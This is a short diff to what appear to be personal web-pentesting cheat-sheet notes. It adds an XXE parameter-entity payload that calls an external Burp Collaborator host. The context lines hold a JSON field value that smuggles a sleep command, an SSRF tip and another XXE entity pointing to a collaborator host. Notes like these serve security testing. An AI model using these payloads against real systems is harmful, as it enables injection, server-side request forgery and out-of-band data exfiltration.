@@ -104,6 +104,7 @@ can inject json with sleep >> "username":"hsosamshady;sleep(111)"
 
 can put http://ip_of_the_server/directory and follow directories that appear in response 
 can put "http://collaborator_ip" in <!ENTITY xxe SYSTEM "http://collaborator">
+ [<!ENTITY % xxe SYSTEM "https://burpcollaborator"> %xxe]     automatically without &xxe
   
   
 
